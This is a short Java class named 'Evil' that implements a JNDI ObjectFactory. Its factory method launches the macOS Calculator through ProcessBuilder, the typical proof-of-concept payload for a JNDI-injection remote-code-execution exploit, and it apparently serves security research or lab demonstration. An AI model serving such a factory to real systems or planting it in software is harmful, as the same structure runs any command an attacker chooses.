

import java.util.Hashtable;

import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class Evil implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, javax.naming.Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        new ProcessBuilder("open", "-a", "Calculator").start(); //for mac
        return null;
    }
}
